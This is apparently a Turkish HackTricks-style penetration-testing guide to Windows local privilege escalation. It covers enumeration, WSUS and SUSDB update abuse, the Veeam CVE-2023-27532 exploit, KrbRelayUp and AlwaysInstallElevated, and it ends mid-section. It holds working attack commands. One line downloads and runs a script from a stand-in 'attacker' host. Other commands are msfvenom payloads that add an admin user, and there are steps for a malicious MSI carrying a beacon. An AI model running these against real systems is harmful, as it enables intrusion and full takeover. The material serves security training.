# Windows Yerel Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

### **Windows yerel yetki yükseltme vektörlerini bulmak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Bu sayfa, temel nitelikteki çeşitli kılavuzlarda yer alan genel Windows yetki yükseltme metodolojisini bir araya getirir.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Uygulamaya yönelik enumerasyon akışı, topluluk atölyeleri ve kontrol listelerinden de yararlanır.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Tarihsel saldırı içeriğinde, Windows yetki yükseltme konulu DerbyCon sunumu da yer alır.<sup>[[5]](#references)</sup>

## Windows Hakkında Temel Bilgiler

### Access Tokens

**Windows access token'larının ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfaya bakın:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows'taki integrity level'ların ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Denetimleri

Windows'ta **sistemi enumerate etmenizi**, yürütülebilir dosyaları çalıştırmanızı **engelleyebilecek** veya etkinliklerinizi **tespit edebilecek** çeşitli unsurlar vardır. Yetki yükseltme için enumerasyona başlamadan önce aşağıdaki **sayfayı** **okuyup** tüm bu **savunma mekanizmalarını** **enumerate etmelisiniz**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fiziksel erişim, çevrimdışı bir UEFI NVRAM düzenlemesini önyükleme öncesi DMA ve Windows `SYSTEM` bellek yamalama zincirine de dönüştürebilir:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess sessiz yükseltme

`RAiLaunchAdminProcess` aracılığıyla başlatılan UIAccess süreçleri, AppInfo güvenli yol denetimleri atlatıldığında istem göstermeden High IL elde etmek için kötüye kullanılabilir. UIAccess/Admin Protection atlatma iş akışını burada inceleyin:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop erişilebilirlik registry yayılımı, keyfi bir SYSTEM registry yazma işlemi (RegPwn) için kötüye kullanılabilir:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Yakın tarihli Windows sürümlerinde, ayrıcalıklı bir yerel NTLM kimlik doğrulamasının yeniden kullanılan bir SMB TCP bağlantısı üzerinden yansıtıldığı **SMB keyfi port** LPE yolu da kullanıma sunuldu:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Sistem Bilgileri

### Sürüm bilgilerini enumerate etme

Windows sürümünün bilinen bir güvenlik açığı olup olmadığını kontrol edin (uygulanmış yamaları da kontrol edin).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Sürüm Exploitleri

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4.700’den fazla güvenlik açığı bulunuyor; bu da Windows ortamının sunduğu **geniş saldırı yüzeyini** gösteriyor.

**Sistem üzerinde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — işletim sistemi derlemesini, yüklü güncellemeleri ve olası ilgili güvenlik duyurularını listeler; bir sonucu geçerli kabul etmeden önce tam ürünü ve yerine geçen güncellemeleri doğrulayın.

Sürüme özgü bir yerel exploit için **çalışan işlemin mimarisini** de işletim sisteminin mimarisiyle birlikte kontrol edin. 64 bit Windows’ta 32 bit bir işlem [WOW64 dosya sistemi yönlendirmesine](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector) tabidir: `%windir%\System32` genellikle 32 bit sistem dizinine karşılık gelirken `%windir%\Sysnative`, bu işlemin yerel sistem dizinine erişmesini sağlar. Bu takma ad 64 bit bir işlemde kullanılamaz. İşletim sistemi derlemesi veya eksik KB adayı, sistemin exploitable olduğunu kanıtlamaz; çalışan derlemeyi, yüklü olan veya onun yerine geçen güncellemeyi, işlem mimarisini ve exploit ön koşullarını söz konusu sorunla ilgili [Microsoft güvenlik bülteniyle](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) karşılaştırın.

**Sistem bilgileriyle yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit depolarının Github listesi:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Ortam değişkenlerinde kayıtlı herhangi bir kimlik bilgisi/Juicy bilgi var mı?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell Geçmişi

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transkript dosyaları

Bunu nasıl etkinleştireceğinizi şu adreste öğrenebilirsiniz: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` yalnızca bir örnektir. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) normalde her kullanıcının Documents klasörüne yazar, ancak `OutputDirectory` ayarı veya `Start-Transcript -OutputDirectory` dosyaları paylaşılan ya da gizli bir klasöre yönlendirebilir. Bir transcript'i incelemeden önce etkin çıktı yolunu ve dosya ACL'sini kontrol edin: transcript komut bağımsız değişkenleri ve çıktılar dahil kimlik bilgileri içerebilir. Okunabilir bir transcript, yalnızca içeriği kullanılabilir, daha yüksek ayrıcalıklı bir kimliği açığa çıkarıyorsa ve bu kimlik ilgili bağlamda oturum açabiliyorsa ipucu niteliğindedir.

### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları kaydedilir; buna yürütülen komutlar, komut çağrıları ve script'lerin bazı bölümleri dahildir. Ancak yürütme ayrıntılarının ve çıktı sonuçlarının tamamı kaydedilmeyebilir.

Bunu etkinleştirmek için belgelendirmedeki "Transcript files" bölümündeki talimatları izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçeneğini tercih edin.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowerShell günlüklerindeki son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Komut dosyasının yürütülmesine ilişkin tüm etkinlikler ve içeriğin tamamı kaydedilir; böylece her kod bloğu çalışırken belgelenir. Bu süreç, adli incelemeler ve kötü amaçlı davranışların analizinde değerli olan kapsamlı bir denetim izi sağlar. Yürütme anındaki tüm etkinlikler belgelenerek süreç hakkında ayrıntılı bilgiler sunulur.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block için logging events, Windows Event Viewer'da şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### İnternet Ayarları

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Sürücüler

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Bir HTTP WSUS endpoint'i, güncelleme metadata'sının araya girilmesine yönelik inceleme için ipucudur. Exploitation ayrıca istemcinin bu WSUS sunucusunu kullanıp kullanmadığına, bir saldırganın trafiği araya girip kontrol edip edemediğine ve istemcinin güncelleme güveni ile kurulum politikasına bağlıdır. URL tek başına kod yürütüldüğünü göstermez. [Microsoft, WSUS metadata'sı için TLS kullanılmasını önerir](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Ağda SSL kullanmayan bir WSUS güncellemesi olup olmadığını kontrol etmek için cmd'de aşağıdakini çalıştırarak başlayın:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ya da PowerShell'de aşağıdakini:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Şunlardan biri gibi bir yanıt alırsanız:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

`UseWUServer` değeri `1` olduğunda Windows Update, yapılandırılmış intranet hizmetini kullanır. Bu, HTTP interception yolu için bir ön koşulun sağlandığını doğrular; ancak interception'ın, kötü amaçlı güncellemelerin kabul edilmesinin veya yükseltilmiş yetkilerle kurulum yapılmasının mümkün olduğunu kanıtlamaz. Değer `0` olduğunda, bu ilkeyle yapılandırılmış WSUS uç noktası seçilmez.

Bu güvenlik açıklarından yararlanmak için [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) gibi araçları kullanabilirsiniz. Bunlar, SSL kullanmayan WSUS trafiğine sahte güncellemeler enjekte etmek için hazırlanmış MiTM exploit script'leridir.

Araştırmayı burada okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Raporun tamamını burada okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Temel olarak, bu hata şu açıktan yararlanır:

> Yerel kullanıcı proxy'mizi değiştirme yetkimiz varsa ve Windows Updates, Internet Explorer ayarlarında yapılandırılan proxy'yi kullanıyorsa, kendi trafiğimizi yakalamak ve varlığımızda yükseltilmiş bir kullanıcı olarak kod çalıştırmak için [PyWSUS](https://github.com/GoSecure/pywsus)'u yerel olarak çalıştırabiliriz.
>
> Ayrıca, WSUS hizmeti geçerli kullanıcının ayarlarını kullandığından, kullanıcının sertifika deposunu da kullanır. WSUS ana bilgisayar adı için kendinden imzalı bir sertifika oluşturup bu sertifikayı geçerli kullanıcının sertifika deposuna eklersek hem HTTP hem de HTTPS WSUS trafiğini yakalayabiliriz. WSUS, sertifika üzerinde ilk kullanımda güven türünde doğrulama yapmak için HSTS benzeri mekanizmalar kullanmaz. Sunulan sertifika kullanıcı tarafından güvenilir bulunursa ve doğru ana bilgisayar adına sahipse hizmet tarafından kabul edilir.

Bu güvenlik açığından [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla yararlanabilirsiniz (araç kullanıma sunulduğunda).

### WSUS yöneticisinin kontrolündeki güncellemeler

Geçerli kimliğin bir WSUS sunucusunda güncellemeleri **yayımlama ve onaylama** yetkisine sahip olduğu durumlarda ayrı bir yol vardır. Sunucunun `WSUS Administrators` grubundaki etkin üyeliği ve devredilmiş WSUS izinlerini denetleyin, ardından onaylanan güncellemeyi alacak istemci bilgisayar grubunu belirleyin. [Microsoft, güncellemeleri onaylamak için WSUS Administrator ayrıcalıkları gerektiğini belirtir](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) ve [yayımlama güven ilişkisini belgeler](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): istemciler, yerel olarak yayımlanan içerik için kullanılan imzalama sertifikasına güvenmelidir. Bunu bir privilege escalation yolu olarak değerlendirmeden önce aday güncellemenin imzalı ve kabul edilmiş olduğunu, hedef için geçerli olduğunu ve daha ayrıcalıklı bir bağlamda yüklendiğini doğrulayın. Tek başına bir HTTP `WUServer` değeri veya grup adı bu koşulların sağlandığını göstermez.

### SUSDB özel güncelleme kötüye kullanımı: `.txt`/`.esd` üzerinden imzasız payload'lar

Bu, HTTP WSUS bağlantısını yakalamaktan farklı bir güven sınırı ihlalidir: ön koşul, özel bir güncellemeyi yayımlamak ve onaylamak için **WSUS veritabanındaki (`SUSDB`) stored procedure'lere** yeterli erişimdir. Uygulanabilir giriş yollarından biri, bir WSUS bilgisayar hesabını `SUSDB` barındıran ayrı bir MSSQL sunucusuna relay etmektir; tam ön koşul dağıtıma özgüdür, bu nedenle SQL administrator haklarını varsaymak yerine önce `EXECUTE` izinlerini listeleyin.<sup>[[38]](#references)[[39]](#references)</sup>

WSUS istemci kimlik doğrulamasını HTTP/8530 üzerinden LDAP, SMB veya AD CS'ye relay eden ayrı saldırı yolu için bkz. [NTLM relay için WSUS HTTP'yi kötüye kullanma](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Güncellemeyi oluşturma, hedefleme ve onaylama

Özel güncelleme iş akışı, kısıtlı bir yayımlama API'si olarak meşru WSUS prosedürlerini kullanır. Önemli durum geçişleri şunlardır:<sup>[[38]](#references)</sup>

| Aşama | İlgili stored procedure'ler |
| --- | --- |
| Güncelleme meta verilerini içe aktarma | `spImportUpdate` |
| Ön koşul, yerelleştirilmiş ve genişletilmiş XML parçalarını depolama | `spSaveXMLFragment` |
| İçerik özetini saldırganın kontrolündeki URL ile ilişkilendirme | `spSetBatchURL` |
| Bilgisayar grubunu listeleme/oluşturma ve istemciyi gruba ekleme | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Bu grup için kurulumu onaylama | `@actionID = 0` ve `@isAssigned = 1` ile `spDeployUpdate` |

Dosya adı, özetler, boyut ve `CommandLineInstallation` handler'ı, içe aktarılan meta veriler ve parçalar arasında birbiriyle eşleşmelidir. İçerik URL'sini ve hedef grubunu atadıktan sonra son onay aşağıdakine benzer; örnek GUID'leri yeniden kullanmak yerine yeni güncelleme, grup ve dağıtım tanımlayıcıları kullanın.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Uzantı tabanlı imza atlatma

WSUS normalde imzasız rastgele yürütülebilir içeriği reddeder. Ancak `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` içindeki .NET `VerifyFile` yolu, verilen dosya adı `.txt` veya `.esd` ile bitiyorsa sertifika kontrolü bayrağını false olarak ayarlar; böylece baytların metin veya geçerli bir ESD görüntüsü olduğu önceden doğrulanmadan `CheckCertificateSignature` atlanır. Bu nedenle, örneğin `payload.exe.txt` olarak adlandırılan değiştirilmemiş bir PE içerik doğrulamasından geçebilir ve daha sonra güncellemenin komut satırı kurulum işleyicisi tarafından başlatılabilir. Bu, imza sahteciliği değil, bir ilke/tür karışıklığı hatasıdır.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS uyumlu hazırlık ve otomasyon

`spDeployUpdate` çağrısı, WSUS'un kayıtlı içeriği almasını sağlar. Kaynak sunucu, BITS'in HTTP beklentilerini karşılamalıdır: erişilebilir bir URL tek başına yeterli değildir; çünkü aktarım başlangıçta `HEAD`/`GET` akışını ve byte-range isteklerini kullanır. Range desteği olmayan bir sunucu, BITS'in Range protokol başlığını gerektirdiğini belirten WSUS eşitleme `EventId=364` hatasına neden olur.<sup>[[39]](#references)</sup>

Araştırma PoC'su [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious), import/fragment/URL/group/deployment zinciri için gereken SQL'i oluşturur, bu zinciri çalıştırmak için değiştirilmiş bir MSSQL client içerir ve içerik hazırlığı için `BitsWebServer.py` dosyasını sunar. Yetkili bir lab ortamında kullanılabilecek minimal komut şöyledir:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Gözetimsiz yürütme ve yeniden deneme kalıcılığı

İstemci tarafındaki etkileşim ilkelere bağlıdır. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` içindeki `4 - Auto download and schedule install` seçeneği, onaylanmış bir güncellemenin kullanıcı tarafından elle seçilmesine gerek kalmadan indirilip yapılandırılmış zamanlamaya göre yüklenmesini sağlar. Testlerde, güncellemesi başarısız/tamamlanmamış durumda kalan bir payload, callback süreci sonlandıktan hemen sonra yeniden sunuldu; bu nedenle yeniden deneme davranışı yinelenen yürütme kalıcılığına dönüşebilir. İstemci güncelleme başarısız durumunu gösterdiğinden bu yöntem gürültülüdür.<sup>[[39]](#references)</sup>

#### Tespit ve güçlendirme adımları

Bu zincirden yararlanarak sunucu ve istemci tarafında uygulanabilecek adımlar:<sup>[[39]](#references)</sup>

- `SUSDB` üzerinde `spCreateTargetGroup`, `spSetBatchURL` ve `spDeployUpdate` yürütmelerini denetleyin; yeni hedefleme gruplarını, harici içerik kaynaklarını, `.txt`/`.esd` güncelleme payload'larını ve beklenmeyen yetkililer (özellikle bilgisayar hesabı olmayan hesaplar) tarafından yapılan dağıtımları inceleyin.
- `C:\Program Files\Update Services\LogFiles` dizininde `ContentSyncAgent`, `FileVerified`, yazım hatası içeren `FileVerficationFailed` ve `EventId=364` kayıtlarını inceleyin; doğrulamayı uzantı ve içerik imzasıyla ilişkilendirin, uzantıya güvenmeyin.
- Windows Update yüklemesinin tekrar tekrar başarısız olup yeniden denenmesini ve `.txt` ya da `.esd` adı taşıyan içerikten kaynaklanan PE yürütmesini veya beklenmeyen alt süreç/ağ etkinliğini araştırın.
- Desteklenen veritabanı hizmetlerinde Authentication için Extended Protection'ı zorunlu kılın ve veritabanı ağ erişimini WSUS sunucusu ile yetkili yönetim sistemleriyle kısıtlayın. Özel güncelleme prosedürleri üzerindeki `EXECUTE` haklarını en aza indirin ve denetleyin.

## Üçüncü Taraf Auto-Updater'lar ve Agent IPC (local privesc)

Birçok kurumsal agent, localhost IPC yüzeyi ve ayrıcalıklı bir güncelleme kanalı sunar. Kayıt işlemi saldırganın sunucusuna yönlendirilebiliyor ve updater sahte bir kök CA'ya ya da zayıf imzalayan denetimlerine güveniyorsa, yerel bir kullanıcı SYSTEM hizmetinin yükleyeceği kötü amaçlı bir MSI gönderebilir. Genelleştirilmiş bir tekniğe (Netskope stAgentSvc zincirini temel alır – CVE-2025-0309) buradan ulaşabilirsiniz:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 üzerinden SYSTEM)

Veeam Backup & Replication ve Cloud Connect, varsayılan olarak **TCP/9401** üzerinde çalışan bir çekirdek yedekleme hizmeti kullanır. [Veeam'in duyurusu](https://www.veeam.com/kb4424), yedekleme ağı sınırları içindeki şifrelenmiş yapılandırma veritabanı kimlik bilgilerinin kimlik doğrulaması olmadan açığa çıkmasını açıklar; ayrı bir herkese açık PoC ise **NT AUTHORITY\SYSTEM** olarak komut yürütme yolunu gösterir.<sup>[[12]](#references)</sup> Hizmet localhost dışındaki adreslere de bağlanabilir; bu nedenle gerçek adresini ve PID'sini kontrol edin.

- **Recon**: TCP/9401'in `Veeam.Backup.Service.exe` sürecine ait olduğunu doğrulayın, ardından kurulu ürünü ve yama meta verilerini inceleyin. `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ipucu verir, ancak yama denetimi için yeterli değildir.
- **Düzeltilmiş sürüm eşikleri**: Veeam, düzeltilen ilk sürümler olarak **11a build 11.0.1.1261 P20230227** ve **12 build 12.0.0.1420 P20230223** sürümlerini listeler; önceki sürümler etkilenir. Dört bileşenli dosya sürümü, aynı build numaralarındaki yamalanmamış temel sürüm ile daha sonraki yamalı sürümü tek başına ayırt edemez. Bir sınır build'ini düzeltilmiş kabul etmeden önce yama tanımlayıcısını [üreticinin build geçmişinden](https://www.veeam.com/kb2680) doğrulayın.
- **Exploit**: Gerekli Veeam DLL'leriyle birlikte `VeeamHax.exe` gibi bir PoC'yi aynı dizine yerleştirin, ardından yerel soket üzerinden bir SYSTEM payload tetikleyin:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Atıfta bulunulan PoC, ek önkoşullar sağlandığında SYSTEM olarak komut yürütüldüğünü gösterir; üreticinin güvenlik duyurusu ise kimlik bilgisi ifşası sorununu açıklar.
## KrbRelayUp

Yerel bir Kerberos relay, uygun bir COM server kimlik doğrulaması yaptığında ve relay edilen principal hedef nesne üzerinde yetkilere sahip olduğunda, düşük ayrıcalıklı bir oturum açma işleminden ayrıcalıklı bir dizin yazma işlemine geçebilir. [KrbRelay belgeleri](https://github.com/cube0x0/KrbRelay) hem RBCD hem de `msDS-KeyCredentialLink` (shadow credential) LDAP yazma işlemlerini kapsar; KrbRelayUp bu yolların bazılarını otomatikleştirir. RBCD zinciri, geçerli delegation ve hedef nesne üzerinde gerekli hakları gerektirirken shadow credential zinciri, key credential yazma haklarını ve sertifika kimlik doğrulama yolunu destekleyen bir KDC'yi gerektirir. Bu yollardan hiçbiri yalnızca etki alanı üyeliğinden kaynaklanmaz.

Gerçek DC'nin [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) ve [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) ilkelerini, relay edilen kimliğin nesne ACL'sini ve seçilen COM sınıfının kimlik doğrulama ve impersonation seviyelerini kontrol edin. Çağıranın oturum açma türü ve kimlik bilgisi bağlamı önemlidir: WinRM oturumu, etkileşimli veya yeni kimlik bilgileriyle yapılan oturum açma işleminden farklı davranabilir. Güvenlik duvarı/OXID yönlendirmesi ve yüklenmiş güncellemeler de sonucu değiştirebilir. Gevşek bir ilkeyi veya eşleşen bir ACL'yi inceleme adayı olarak değerlendirin; pasif numaralandırma COM coercion, relay kimlik doğrulaması veya dizine yazma işlemlerini tetiklememelidir. Makine hesabı shadow credential'ı bir makine ticket'ına ve yalnızca bu hesap gerekli dizin replikasyonu haklarına sahipse ayrı bir DCSync yoluna gidebilir.

**Exploit'i** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) adresinde bulun.

Saldırı akışı hakkında daha fazla bilgi için [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> adresini inceleyin.

## AlwaysInstallElevated

Bu 2 kayıt defteri girdisi **etkinse** (değer **0x1** ise), herhangi bir ayrıcalık düzeyindeki kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (yürütebilir).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payload'ları

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Bir meterpreter session'ınız varsa bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

Mevcut dizinde yetki yükseltmek için bir Windows MSI binary'si oluşturmak üzere power-up'taki `Write-UserAddMSI` komutunu kullanın. Bu script, kullanıcı/grup ekleme istemi gösteren önceden derlenmiş bir MSI installer yazar (bu nedenle GUI erişimine ihtiyacınız olacak):

```
Write-UserAddMSI
```

Oluşturulan binary'yi çalıştırarak ayrıcalıkları yükseltin.

### MSI Wrapper

Bu araçları kullanarak MSI wrapper oluşturmayı öğrenmek için bu öğreticiyi okuyun. Yalnızca **komut satırlarını** **çalıştırmak** istiyorsanız bir "**.bat**" dosyasını wrapper içine alabileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike veya Metasploit ile `C:\privesc\beacon.exe` konumunda **yeni bir Windows EXE TCP payload** **oluşturun**.
- **Visual Studio**'yu açın, **Create a new project** seçeneğini belirleyin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçip **Next**'e tıklayın.
- **AlwaysPrivesc** gibi bir proje adı verin, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini belirleyin ve **Create**'e tıklayın.
- 3/4. adıma (include edilecek dosyaları seçme) gelene kadar **Next**'e tıklayın. **Add**'e tıklayıp az önce oluşturduğunuz Beacon payload'ını seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer**'da **AlwaysPrivesc** projesini seçin ve **Properties** bölümünde **TargetPlatform** değerini **x86**'dan **x64**'e değiştirin.
  - Yüklü uygulamanın daha meşru görünmesini sağlayabilecek **Author** ve **Manufacturer** gibi başka özellikleri de değiştirebilirsiniz.
- Projeye sağ tıklayıp **View > Custom Actions**'ı seçin.
- **Install**'a sağ tıklayıp **Add Custom Action**'ı seçin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Bu, installer çalıştırılır çalıştırılmaz Beacon payload'ının çalıştırılmasını sağlar.
- **Custom Action Properties** altında **Run64Bit** değerini **True** olarak değiştirin.
- Son olarak **build edin**.
  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı gösterilirse platformu x64 olarak ayarladığınızdan emin olun.

### MSI Installation

Kötü amaçlı `.msi` dosyasının **kurulumunu** arka planda gerçekleştirmek için:

```
